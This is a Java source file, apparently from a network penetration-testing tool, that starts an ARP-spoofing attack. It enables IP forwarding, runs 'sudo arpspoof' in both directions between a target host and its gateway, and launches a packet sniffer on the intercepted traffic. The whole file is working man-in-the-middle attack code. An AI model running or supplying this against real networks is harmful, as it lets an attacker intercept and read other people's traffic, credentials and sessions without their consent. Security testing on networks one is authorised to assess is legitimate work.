package org.npt.networkservices;

import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.npt.models.Target;
import org.npt.models.Task;
import org.npt.services.ProcessService;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

@Slf4j
class DefaultArpSpoofStarter implements ArpSpoofStarter {

    private static final String COMMAND = "sudo arpspoof -i %s -t %s %s";

    private static final String PROCESS_NAME = "Spoofing the following Target : %s , Gateway : %s";

    private static ArpSpoofStarter instance = null;

    @Getter
    private final List<PacketSniffer> packetSniffers = new ArrayList<>();

    private DefaultArpSpoofStarter() {
        ProcessService.execute("Enable IP Forwarding", new String[]{"sudo sysctl -w net.ipv4.ip_forward=1"});
    }

    @Override
    public Optional<PacketSniffer> getPacketSnifferByTarget(Target target) {
        return Optional.empty();
    }

    public void stopSpoofing(String targetIp, String gatewayIp) {
        final String processName = ProcessService.ProcessUtils.generateProcessNameFrom(String.format(PROCESS_NAME, targetIp, gatewayIp));
        ProcessService.tasks.stream()
                .filter(task -> task.getProcessName().equals(processName))
                .forEach(Task::destroy);
    }

    public void startSpoofing(String scanInterface, Target target, String gatewayIp) {
        final String commandFirst = String.format(COMMAND, scanInterface, target.findFirstIPv4().get(), gatewayIp);
        final String commandSecond = String.format(COMMAND, scanInterface, gatewayIp, target.findFirstIPv4().get());
        String processName = String.format(PROCESS_NAME, target.findFirstIPv4().get(), gatewayIp);
        processName = ProcessService.ProcessUtils.generateProcessNameFrom(processName);
        ProcessService.execute(processName, new String[]{commandFirst});
        ProcessService.execute(processName, new String[]{commandSecond});
        PacketSniffer defaultPacketSniffer = PacketSniffer.create(target, scanInterface);
        packetSniffers.add(defaultPacketSniffer);
        new Thread(defaultPacketSniffer).start();
    }

    public static ArpSpoofStarter getInstance() {
        if (instance == null)
            instance = new DefaultArpSpoofStarter();
        return instance;
    }

}

public interface ArpSpoofStarter {

    public Optional<PacketSniffer> getPacketSnifferByTarget(Target target);

    public List<PacketSniffer> getPacketSniffers();

    public void stopSpoofing(String targetIp, String gatewayIp);

    public void startSpoofing(String scanInterface, Target target, String gatewayIp);

    public static ArpSpoofStarter getInstance() {
        return DefaultArpSpoofStarter.getInstance();
    }
}
